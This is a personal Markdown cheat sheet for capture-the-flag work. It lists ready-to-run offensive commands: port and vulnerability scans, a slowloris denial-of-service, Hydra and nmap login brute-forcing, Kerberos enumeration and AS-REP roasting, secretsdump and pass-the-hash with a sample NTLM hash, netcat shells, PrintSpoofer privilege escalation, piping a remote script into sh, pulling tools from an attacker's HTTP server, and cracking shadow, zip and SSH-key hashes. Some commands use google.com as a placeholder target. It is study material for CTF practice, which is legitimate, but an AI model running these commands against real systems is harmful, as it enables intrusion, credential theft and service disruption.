# CTF Kunai
---------------------------------------------------------------------------
### Author : Me/Myself
#### This is help me a lot while doing CTF. 

---------------------------------------------------------------------------

## Table Of Contents
* [Web Exploitation](#web-exploitation)
  * [Enumeration](#enumeration)
    * [Dirsearch](#dirsearch)
    * [Enum4linux](#enum4linux)
    * [Gobuster](#gobuster)
    * [Nmap](#nmap)
    * [Rustscan](#rustscan)
    * [Wpscan](#wpscan)
  * [Exploitation](#exploitation)
    * [Hydra](#hydra)
    * [Evil-winrm](#evil-winrm)
    * [Impacket](#impacket)
    * [Kerberos](#kerberos)
    * [Kerbrute](#kerbrute)
    * [Netcat](#netcat)
    * [Ffuf](#ffuf)
    * [Peass-ng](#peass-ng)
    * [PrintSpoofer](#printspoofer)
    * [Smbclient](#smbclient)
    * [Socat](#socat) 
    * [Viper Monkey](#viper-monkey)


* [Cryptography](#Cryptography)
  * [John The Ripper](#john-the-ripper)
  * [Hashcat](#hashcat)

* [Command](#Command)
  * [Find](#find)
  * [FTP](#ftp)
  * [RDP](#rdp)
  * [SSH](#ssh)

* [Template](#template)
  * [Template Software](#template-software)
  * [Template Command](#template-command)
  * [Template Link](ooooooooooooooo)

---------------------------------------------------------------------------

# Web Exploitation

- # Enumeration
### Dirsearch
- ###  Brute Force URL
dirsearh -u http://google.com
###### Example :
```
dirsearch -u http://hackme.my.id/
```
- ###  Brute Force Existing URL
dirsearh -u http://google.com -x 403
###### Example :
```
dirsearch -u http://hackme.my.id/ -x 403
```
- ###  Brute Force URL with Extensions
dirsearh -u http://google.com -e php,html,js,txt
###### Example :
```
dirsearch -u http://hackme.my.id/ -e php,html,js,txt
```

## Gobuster
### 𝚰. Gobuster Dir
- ### Find Website Directory 
gobuster dir -u [website url] -w [path to wordlist]  
###### Example :
```
gobuster dir -u https://10.10.10.11 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt  
```
- ### Find Website Directory with Spesific Extension 
gobuster dir -u [website url] -w [path to wordlist] -x .php, .txt
###### Example :
```
gobuster dir -u http://10.10.10.11/ -w /usr/share/wordlists/Discovery/Web-Content/common.txt -x .php, .txt 
```
### 𝚰𝚰. Gobuster Vhost
- ### Find Subdomain Directory 
gobuster vhost -v -u [website url] -w [path to wordlist]  
###### Example :
```
gobuster vhost -v -u https://10.10.10.11 -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt  
```

### 𝚰𝚰𝚰. Gobuster DNS
- ### Find Subdomain In A Spesific Domain 
gobuster dns -d [domain] -w [path to wordlist] -i
###### Example :
```
gobuster dns test.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -i 
```

## Enum4linux
- ###  Enumerate Windows and SMB Shares
enum4linux [IP Target]
###### Example :
```
enum4linux 10.10.10.11
```

---------------------------------------------------------------------------

## Nmap
### 𝚰. Enumeration And Information Gathering

- ### All Port Scanning
nmap -p- [IP Target]
###### Example :
```
nmap -p- 10.10.10.11
```

- ### Service Scanning
nmap -sV [IP Target]
###### Example :
```
nmap -sV 10.10.10.11
```

- ### Faster OS and Service Scanning
nmap -A -T4 -n [IP Target]
###### Example :
```
nmap -A -T4 10.10.10.11
```

- ### TCP protocols scanning
nmap -sT [IP Target]
###### Example :
```
nmap -sT 10.10.10.11
```

- ### UDP protocols scanning
nmap -sU [IP Target]
###### Example :
```
nmap -sU 10.10.10.11
```

- ### CVE Scanning
nmap -Pn --script vuln [IP Target]
###### Example :
```
nmap -Pn --script vuln 10.10.10.11
```

- ### Aggressively all port Scanning
nmap -sC -sV -p- -T4 --min-rate=9326 -vv [IP Target]
###### Example :
```
nmap -n -sC -sV -p- -T4 --min-rate=9326 -vv -n 10.10.10.11
```

- ### Malware Infection Scanning
nmap -sV --script=http-malware-host [IP Target]
###### Example :
```
nmap -sV --script=http-malware-host 10.10.10.11
```
sm
### 𝚰𝚰. Penetration Testing
- ### DOS 
nmap [IP Target] -max-parallelism 800 -Pn --script http-slowloris --script-args http-slowloris.runforever=true
###### Example :
```
nmap 10.10.10.1 -max-parallelism 800 -Pn --script http-slowloris,dos --script-args http-slowloris.runforever=true
```

- ### Wordpress Bruteforce
nmap -sV --script http-wordpress-brute --script-args 'userdb=users.txt,passdb=passwds.txt,http-wordpress-brute.hostname=domain.com, http-wordpress-brute.threads=3,brute.firstonly=true' [IP Target]
###### Example :
```
nmap -sV --script http-wordpress-brute --script-args 'userdb=users.txt,passdb=passwds.txt,http-wordpress-brute.hostname=domain.com, http-wordpress-brute.threads=3,brute.firstonly=true' 10.10.10.11
```

- ### Ftp Bruteforce
nmap --script ftp-brute -p  --script-args userdb=users.txt,passdb=passwords.txt 21 [IP Target]
###### Example :
```
nmap --script ftp-brute -p 21 --script-args userdb=[username-wordlist.txt],passdb=[passwords-wordlist.txt] 10.10.10.1
```
---------------------------------------------------------------------------
## Rustscan
- ###  Port And Service Scanning
rustscan [IP Target] --ulimit 5000
###### Example :
```
rustscan 10.10.10.11 --ulimit 5000 
```
## Wpscan
- ###  Wordpress Scanning
wpscan --url google.com
###### Example :
```
wpscan --url blog.thm 
```
- ###  Wordpress Enumerate User
wpscan --url google.com --enumerate u
###### Example :
```
wpscan --url blog.thm --enumerate u 
```


------------------------------------------------------------------------------------------------------------------------------------------------------
- # Exploitaion
## Hydra
- ### FTP Bruteforce
hydra -l user -P [path to pass-wordlist] ftp://[IP Target]
###### Example :
```
hydra -l user -P /usr/share/wordlists/rockyou.txt ftp://10.10.10.11
```
- ### SSH Bruteforce
hydra -l [username] -P [path to pass-wordlist] [IP Target] -t 4 ssh
###### Example :
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.11 -t 4 ssh 
```

- ### Post Web Form
hydra -l [username] -P [path to pass-wordlist] [IP Target] http-post-form "/[login webpage]:username=^USER^&password=^PASS^:F=[Failed login message]" -V 
###### Example :
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.11 http-post-form "/login:username=^USER^&password=^PASS^:incorrect" -V
```
- ###  Http-get Web Brute Force
hydra -l admin -P [path to pass-wordlist] [IP Target] http-get -t 64
###### Example :
```
hydra -l rascal -P /usr/share/wordlists/rockyou.txt 10.10.244.40 http-get -t 64 
```
- ### Hydra User Enumerate
hydra -L [path to user-wordlist] -p test [IP Target] http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid Username." -V
###### Example :
```
hydra -L fsociety.dic -p test 10.10.10.11 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid Username." -V
```
- ### Brute Force The User Password 
hydra -l [Valid User] -P [path to pass-wordlist] [IP Target] http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:[Failed Login Message]" -V
###### Example :
```
hydra -l Elliot -P fsocity.dic 10.10.10.11 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username" -V
```

---------------------------------------------------------------------------
## Kerbrute
- ### Enumerating Valid User
./kerbrute_linux_amd64 userenum -dc [target domain controller] -d [domain] [path to user-wordlist]
###### Example :
```
./kerbrute_linux_amd64 userenum --dc 10.10.10.11 -d spookysec.local /usr/share/wordlists/userlist.txt
```
---------------------------------------------------------------------------
## Impacket
After get the valid user now let's get the query ticket from the user using Impacket tools (GetNPUsers)
- ### Query Ticket with GetNPUsers.py
./GetNPUsers.py -no-pass -dc-ip [target domain controller] [domain]/[valid user]
###### Example :
```
./GetNPUsers.py -no-pass -dc-ip 10.10.10.11 spookysec.local/svc-admin
```

- ### NTLM Hash with secretsdump
secretsdump.py -dc-ip [IP Target] [domain]/[user from credential]:[pass from credential]@[IP Target]
###### Example :
```
secretsdump.py -dc-ip 10.10.154.40 spookysec.local/backup:backup2517860@10.10.154.40
```
---------------------------------------------------------------------------

## Hashcat
[Hash Type Documentation](https://hashcat.net/wiki/doku.php?id=example_hashes)
- ### Identify the hash using hash-identifier
```
hash-identifier 
```
- ### Identify the hash using hashid
hashid -m [file contains query]
###### Example :
```
hashid -m hash.txt
```
- ### Hashing the hash with hash type
hashcat -m [hash type] [file contains query] [path to user-wordlist]
###### Example :
```
hashcat -m 18200 hash.txt /usr/share/wordlists/passwordlist.txt 
```
- ### Hashing the hash with hash type
hashcat -m [hash type] [file contains query] [path to user-wordlist]
###### Example :
```
hashcat -m 18200 hash.txt /usr/share/wordlists/passwordlist.txt 
```
- ### Force hashing with hash type
hashcat -m [hash type] -a 0 [file contains query] [path to user-wordlist] --force
###### Example :
```
hashcat -m 18200 -a 0 hash.txt /usr/share/wordlists/passwordlist.txt --force
```

---------------------------------------------------------------------------

## Netcat
- ###  Netcat Listener
nc -lvnp <port-number>
###### Example :
```
nc -lvnp 4444
```
- ###  Bind Shells
nc <target-ip> <chosen-port>
###### Example :
```
nc 10.10.10.11 4444
```
- ###  Netcat Stabilisation
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
```
export TERM=xterm
```
press ctrl+z to background the shell
```
stty raw -echo; fg
```
---------------------------------------------------------------------------
## Smbclient 
- ### Smbclient IP Listing
smbclient -L [IP Target] 
###### Example :
```
smbclient -L 10.10.10.11
```
- ### Smbclient Domain Listing
smbclient -L [IP Target] -U '[domain]'
###### Example :
```
smbclient -L 10.10.10.11 -U 'svc-admin'
```
- ### Smbclient Login
smbclient //[IP Target]/backup -U '[domain]'
###### Example :
```
smbclient //10.10.10.11/backup -U 'svc-admin'
```

## Socat
- ###  Fork SSH in the specific port from Target Machine
First Install [Socat Binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat), After that run the binary.
./socat tcp-listen:[Port Number],reuseaddr,fork tcp:localhost:22
###### Example :
```
./socat tcp-listen:8888,reuseaddr,fork tcp:localhost:22 
```
---------------------------------------------------------------------------
## Evil-winrm
- ### Login With Hash key 
evil-winrm -i [IP Target] -u [User] -H [NTLM Hash]
###### Example :
```
evil-winrm -i 10.10.154.40 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
```
---------------------------------------------------------------------------
## Kerberos
### 𝚰. Rubeus
- ### Harvest Ticket
The ticket is used in other attacks such as the pass the ticket attack.
###### Example :
```
Rubeus.exe harvest /interval:30
```
- ### Brute-Forcing and Password-Spraying
First, add your target IP and target Domain in your machine hosts file
#### ❒ Windows :
echo 10.10.10.11 targetdomain.com >> C:\Windows\System32\drivers\etc\hosts
###### Example :
```
echo 10.10.41.179 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
```
#### ❒ Linux :
echo 10.10.10.11 targetdomain.com >> /etc/hosts
###### Example :
```
echo 10.10.41.179 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
```

#### ❒ After that you can brute/password spray the target.
The ticket is used in other attacks such as the pass the ticket attack.
###### Example :
```
Rubeus.exe brute /password:Password1 /noticket
```
---------------------------------------------------------------------------
## Viper Monkey
- ### Display IOCs VBA 
pypy [path to vmonkey.py] --iocs [path to file]
###### Example :
```
pypy ./ViperMonkey-master/vipermonkey/vmonkey.py --iocs /home/kali/Downloads/invoice.vb
```
---------------------------------------------------------------------------

  
## Ffuf
- ###  Fuzzing URL Directory
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt:FUZZ -u http://google.com/FUZZ
###### Example :
```
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt:FUZZ -u http://trick.htb/FUZZ 
```

- ###  Fuzzing Subdomain Directory
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt:FUZZ -u http://google.com/ -H 'Host: FUZZ.google.com' -v -fs 5480 
###### Example :
```
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt:FUZZ -u http://trick.thb/ -H 'Host: FUZZ.trick.htb' -v -fs 5480 
```

- ###  Fuzzing LFI Directory
ffuf -w /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://google.com/index.php?page=FUZZ -v -fs 0
###### Example :
```
ffuf -w /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://preprod-marketing.trick.htb/index.php?page=FUZZ -v -fs 0 
```

- ###  Fuzzing Username Directory
```
ffuf -w /usr/share/wordlists/dirb/big.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.62.169/customers/signup -mr "username already exists" 
```

- ###  Fuzzing Password Directory
```
ffuf -w ./your_valid_usernames.txt:W1,./your-wordlists:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.62.169/customers/login -fc 200 
```


## PrintSpoofer
- ###  Windows Priviledge Escalation
Software .exe -> https://github.com/dievus/printspoofer
###### Example :
```
PrintSpoofer.exe -i -c cmd 
```
## Peass-ng
- [Link Repo PEASS](https://github.com/carlospolop/PEASS-ng)
- [Install PEASS](https://github.com/carlospolop/PEASS-ng/releases/)
### 𝚰. Linpeas
- ### Linpeas with curl 
```
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh  
```
- ### Linpeas run from Attacking Machine to Target Machine
First Install Linpeas.sh File in [Install PEASS](https://github.com/carlospolop/PEASS-ng/releases/)
After that, open port in Attacking Machine so the Target Machine can Download an Run This file.
```
python3 -m http.server 9999   
```
Install File from Attacking Machine to the Target Machine
###### Example :
wget http://[IP Local]:9999/linpeas.sh   
```
wget http://10.10.10.11:9999/linpeas.sh   
```
From The Target Machine give file execute permission and run the file
```
chmod +x linpeas.sh   
```
```
./linpeas.sh   
```
### 𝚰𝚰. Winpeas
- ### Winpeasx64 Run Locally Powershell
First install Winpeasx64.exe [Install PEASS](https://github.com/carlospolop/PEASS-ng/releases/)
After that, open port in Attacking Machine so the Target Machine can Download an Run This file.
```
python3 -m http.server 9999   
```
Install File from Attacking Machine to the Target Machine
###### Example :
IWR http://[IP Local]:9999/winPEASx64.exe -OutFile winPEASx64.exe
```
IWR http://10.10.10.11:9999/winPEASx64.exe -OutFile winPEASx64.exe
```
Run the file
```
.\winPEASx64.exe
```




# Cryptography
## John The Ripper

- ### Show Format Syntax
john [options] [path to file]
###### Example :
```
john --show=formats hash.txt
```

- ### Automatic Cracking with wordlist
john --wordlist=[path to wordlist] [path to file]
###### Example :
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

- ### Format-Specific Cracking
john --format=[format] --wordlist=[path to wordlist] [path to file]
###### Example :
```
john --format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

- ### Unshadow file
unshadow [path to passwd] [path to shadow] > [file to fill unshadow]
###### Example :
```
unshadow local_passwd local_shadow > unshadowed.txt
```
#### ❒After get the unshadow file now crack the hash
```
john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
```

- ### Single Crack Mode
john --single --format=[format] [path to file]
###### Example :
```
john --single --format=raw-md5 hash7.txt
```
###### notes : hash7.txt -> “ username:[hash_script] “

- ### Crack Zip File Password
zip2john [options] [zip file] > [output file]
###### Example :
```
zip2john secure.zip > secure.txt
```
#### ❒ After get the secure.txt now crack the file
```
john --wordlist=/usr/share/wordlists/rockyou.txt secure.txt
```

- ### Crack Rar File Password
rar2john [rar file] > [output file]
###### Example :
```
rar2john secure.rar > secure-rar.txt
```
#### ❒ After get the secure-rar.txt now crack the file
```
john --wordlist=/usr/share/wordlists/rockyou.txt secure-rar.txt
```

- ### Crack SSH Key Password
ssh2john [id_rsa private key file] > [output file]]
###### Example :
```
ssh2john id_rsa.rsa > id_rsa.txt
```
#### ❒ After get the id_rsa.txt now crack the file
```
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.txt
```

---------------------------------------------------------------------------

# Command


## Cryptography
- ###  Base64 Encode
```
echo "Hello World" | base64
```
- ###  Base64 Decode
```
echo "SGVsbG8gV29ybGQK" | base64 -d
```

---------------------------------------------------------------------------

## Find
- ###  Find file by name
```
find / -type f -name *flag*.txt 2>/dev/null
```
```
find / -type f -name *user*.txt 2>/dev/null
```
```
find / -type f -name *root*.txt 2>/dev/null
```
---------------------------------------------------------------------------
## Format Strings
- ###  Input to Hex
```
%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
```
---------------------------------------------------------------------------
## FTP
- ###  How To FTP
```
ftp 10.10.10.11
```
---------------------------------------------------------------------------
## RDP
- ###  How To RDP
```
rdesktop Administrator@MyDomain 10.10.10.11
```
---------------------------------------------------------------------------

## SSH
- ###  How To SSH
```
ssh root@10.10.10.11
```
- ###  SSH with Public Key
```
ssh -i id_rsa root@10.10.10.11
```
---------------------------------------------------------------------------
# Template
## Template Software
- ###  oooooooo
ooooooooooooooooooooooooooooooooooo
###### Example :
```
ooooooooooooooooooooooooooooooooooo 
```

---------------------------------------------------------------------------
## Template with Sub Contents
### 𝚰. oooooooo
- ### ooooooooooooooooooooooooooooooooooo 
ooooooooooooooooooooooooooooooooooo  
###### Example :
```
ooooooooooooooooooooooooooooooooooo  
```
### 𝚰𝚰. oooooooo
- ### ooooooooooooooooooooooooooooooooooo 
ooooooooooooooooooooooooooooooooooo  
###### Example :
```
ooooooooooooooooooooooooooooooooooo  
```

---------------------------------------------------------------------------
## Template Command
- ###  oooooooo
```
ooooooooooooooooooooooooooooooooooo
```

---------------------------------------------------------------------------
